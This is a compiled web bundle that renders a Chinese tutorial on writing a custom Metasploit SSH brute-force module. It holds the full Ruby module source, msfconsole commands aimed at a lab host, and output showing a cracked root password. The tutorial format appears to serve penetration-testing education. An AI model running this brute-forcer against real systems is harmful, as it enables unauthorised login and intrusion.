(window.webpackJsonp=window.webpackJsonp||[]).push([[356],{652:function(s,n,a){"use strict";a.r(n);var e=a(7),t=Object(e.a)({},(function(){var s=this,n=s._self._c;return n("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[n("h1",{attrs:{id:"metasploit自定义ssh认证暴力破解器"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#metasploit自定义ssh认证暴力破解器"}},[s._v("#")]),s._v(" Metasploit自定义SSH认证暴力破解器")]),s._v(" "),n("p",[s._v("这里，我们首先编写一个脚本ssh_brute_by_binghe.rb，具体如下：")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("##\n# Author 冰河\n# Date 2019-01-12\n# Description 自定义SSH暴力破解模块，用于暴力破解SSH\n##\n\nrequire 'msf/core'\nrequire 'metasploit/framework/credential_collection'\nrequire 'metasploit/framework/login_scanner/ssh'\n\nclass Metasploit3 < Msf::Auxiliary\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n  #提供必要的暴力破解机制和功能，例如提供了单独的登录用户名和密码表，生词表、空密码等选项\n  include Msf::Auxiliary::AuthBrute\n  \n  #初始化基础信息\n  def initialize\n    super(\n      'Name'        => 'SSH Scanner',\n      'Description' => %q{\n        SSH Brute Tool\n      },\n      'Author'      => 'binghe',\n      'License'     => MSF_LICENSE\n    )\n   register_options(\n   [\n      Opt::RPORT(22)\n   ],self.class)\n   end\n   \n   def run_host(ip)\n     #cred_collection实现了按照数据存储选项来设置登录凭证\n     cred_collection = Metasploit::Framework::CredentialCollection.new(\n        blank_passwords: datastore['BLANK_PASSWORDS'],\n        pass_file: datastore['PASS_FILE'],\n        password: datastore['PASSWORD'],\n        user_file: datastore['USER_FILE'],\n        userpass_file: datastore['USERPASS_FILE'],\n        username: datastore['USERNAME'],\n        user_as_pass: datastore['USER_AS_PASS'],\n     )\n     \n     scanner = Metasploit::Framework::LoginScanner::SSH.new(\n        host: ip,\n        port: datastore['PORT'],\n        cred_details: cred_collection,\n        proxies: datastore['Proxies'],\n        stop_on_success: datastore['STOP_ON_SUCCESS'],\n        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],\n        connection_timeout: datastore['SSH_TIMEOUT'],\n        framework: framework,\n        framework_module: self,\n     )\n     \n     #使用.scan实现扫描的初始化，它将完成所有的登录尝试\n     scanner.scan! do |result|\n        #to_h 将数据转换成哈希格式\n        credential_data = result.to_h\n        #将名字和工作区id合并到credential_data变量中\n        credential_data.merge!(\n            module_fullname: self.fullname,\n            workspace_id: myworkspace_id\n        )\n        \n        #登录凭证正确，保存到数据库，并打印信息\n        if result.success?\n          credential_core = create_credential(credential_data)\n          credential_data[:core] = credential_core\n          create_credential_login(credential_data)\n          \n          print_good \"#{ip} - LOGIN SUCCESSFUL: #{result.credential}\"\n          \n        #登录凭证不正确，将credential_data传入到invalidate_login方法，并打印信息\n        else\n          invalidate_login(credential_data)\n          print_status \"#{ip} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})\"\n        end\n      end     \n   end\nend\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br"),n("span",{staticClass:"line-number"},[s._v("13")]),n("br"),n("span",{staticClass:"line-number"},[s._v("14")]),n("br"),n("span",{staticClass:"line-number"},[s._v("15")]),n("br"),n("span",{staticClass:"line-number"},[s._v("16")]),n("br"),n("span",{staticClass:"line-number"},[s._v("17")]),n("br"),n("span",{staticClass:"line-number"},[s._v("18")]),n("br"),n("span",{staticClass:"line-number"},[s._v("19")]),n("br"),n("span",{staticClass:"line-number"},[s._v("20")]),n("br"),n("span",{staticClass:"line-number"},[s._v("21")]),n("br"),n("span",{staticClass:"line-number"},[s._v("22")]),n("br"),n("span",{staticClass:"line-number"},[s._v("23")]),n("br"),n("span",{staticClass:"line-number"},[s._v("24")]),n("br"),n("span",{staticClass:"line-number"},[s._v("25")]),n("br"),n("span",{staticClass:"line-number"},[s._v("26")]),n("br"),n("span",{staticClass:"line-number"},[s._v("27")]),n("br"),n("span",{staticClass:"line-number"},[s._v("28")]),n("br"),n("span",{staticClass:"line-number"},[s._v("29")]),n("br"),n("span",{staticClass:"line-number"},[s._v("30")]),n("br"),n("span",{staticClass:"line-number"},[s._v("31")]),n("br"),n("span",{staticClass:"line-number"},[s._v("32")]),n("br"),n("span",{staticClass:"line-number"},[s._v("33")]),n("br"),n("span",{staticClass:"line-number"},[s._v("34")]),n("br"),n("span",{staticClass:"line-number"},[s._v("35")]),n("br"),n("span",{staticClass:"line-number"},[s._v("36")]),n("br"),n("span",{staticClass:"line-number"},[s._v("37")]),n("br"),n("span",{staticClass:"line-number"},[s._v("38")]),n("br"),n("span",{staticClass:"line-number"},[s._v("39")]),n("br"),n("span",{staticClass:"line-number"},[s._v("40")]),n("br"),n("span",{staticClass:"line-number"},[s._v("41")]),n("br"),n("span",{staticClass:"line-number"},[s._v("42")]),n("br"),n("span",{staticClass:"line-number"},[s._v("43")]),n("br"),n("span",{staticClass:"line-number"},[s._v("44")]),n("br"),n("span",{staticClass:"line-number"},[s._v("45")]),n("br"),n("span",{staticClass:"line-number"},[s._v("46")]),n("br"),n("span",{staticClass:"line-number"},[s._v("47")]),n("br"),n("span",{staticClass:"line-number"},[s._v("48")]),n("br"),n("span",{staticClass:"line-number"},[s._v("49")]),n("br"),n("span",{staticClass:"line-number"},[s._v("50")]),n("br"),n("span",{staticClass:"line-number"},[s._v("51")]),n("br"),n("span",{staticClass:"line-number"},[s._v("52")]),n("br"),n("span",{staticClass:"line-number"},[s._v("53")]),n("br"),n("span",{staticClass:"line-number"},[s._v("54")]),n("br"),n("span",{staticClass:"line-number"},[s._v("55")]),n("br"),n("span",{staticClass:"line-number"},[s._v("56")]),n("br"),n("span",{staticClass:"line-number"},[s._v("57")]),n("br"),n("span",{staticClass:"line-number"},[s._v("58")]),n("br"),n("span",{staticClass:"line-number"},[s._v("59")]),n("br"),n("span",{staticClass:"line-number"},[s._v("60")]),n("br"),n("span",{staticClass:"line-number"},[s._v("61")]),n("br"),n("span",{staticClass:"line-number"},[s._v("62")]),n("br"),n("span",{staticClass:"line-number"},[s._v("63")]),n("br"),n("span",{staticClass:"line-number"},[s._v("64")]),n("br"),n("span",{staticClass:"line-number"},[s._v("65")]),n("br"),n("span",{staticClass:"line-number"},[s._v("66")]),n("br"),n("span",{staticClass:"line-number"},[s._v("67")]),n("br"),n("span",{staticClass:"line-number"},[s._v("68")]),n("br"),n("span",{staticClass:"line-number"},[s._v("69")]),n("br"),n("span",{staticClass:"line-number"},[s._v("70")]),n("br"),n("span",{staticClass:"line-number"},[s._v("71")]),n("br"),n("span",{staticClass:"line-number"},[s._v("72")]),n("br"),n("span",{staticClass:"line-number"},[s._v("73")]),n("br"),n("span",{staticClass:"line-number"},[s._v("74")]),n("br"),n("span",{staticClass:"line-number"},[s._v("75")]),n("br"),n("span",{staticClass:"line-number"},[s._v("76")]),n("br"),n("span",{staticClass:"line-number"},[s._v("77")]),n("br"),n("span",{staticClass:"line-number"},[s._v("78")]),n("br"),n("span",{staticClass:"line-number"},[s._v("79")]),n("br"),n("span",{staticClass:"line-number"},[s._v("80")]),n("br"),n("span",{staticClass:"line-number"},[s._v("81")]),n("br"),n("span",{staticClass:"line-number"},[s._v("82")]),n("br")])]),n("p",[s._v("接下来我们将ssh_brute_by_binghe.rb上传到Kali的/usr/share/metasploit-framework/modules/auxiliary/scanner/ssh目录下。")]),s._v(" "),n("p",[s._v("在运行这个脚本之前，我们先使用Metasploit中的msftidy工具检查一下此脚本的语法是否正确。")]),s._v(" "),n("p",[s._v("在Kali的命令行执行如下命令：")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("/usr/share/metasploit-framework/tools/dev/msftidy.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/ssh/ssh_brute_by_binghe.rb \n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br")])]),n("p",[s._v("未输出任何信息，证明脚本正确。")]),s._v(" "),n("p",[s._v("接下来，我们在msf终端运行ssh_brute_by_binghe.rb脚本")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("msfconsole\nset RHOSTS 192.168.109.159\nset USER_FILE /root/user\nset PASS_FILE /root/pass\nrun\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br")])]),n("p",[s._v("最终输出结果为：")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("[*] 192.168.109.159 - LOGIN FAILED: root:admin (Incorrect: )\n[+] 192.168.109.159 - LOGIN SUCCESSFUL: root:admin123\n[*] 192.168.109.159 - LOGIN FAILED: admin:123456 (Incorrect: )\n[*] 192.168.109.159 - LOGIN FAILED: admin:admin (Incorrect: )\n[*] 192.168.109.159 - LOGIN FAILED: admin:binghe (Incorrect: )\n[*] 192.168.109.159 - LOGIN FAILED: binghe:123456 (Incorrect: )\n[*] 192.168.109.159 - LOGIN FAILED: binghe:admin (Incorrect: )\n[*] 192.168.109.159 - LOGIN FAILED: binghe:binghe (Incorrect: )\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br")])]),n("h2",{attrs:{id:"写在最后"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[s._v("#")]),s._v(" 写在最后")]),s._v(" "),n("blockquote",[n("p",[s._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),n("strong",[s._v("冰河技术")]),s._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),n("strong",[s._v("冰河技术")]),s._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),n("strong",[s._v("冰河技术")]),s._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),n("strong",[s._v("冰河技术")]),s._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),s._v(" "),n("p",[n("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);n.default=t.exports}}]);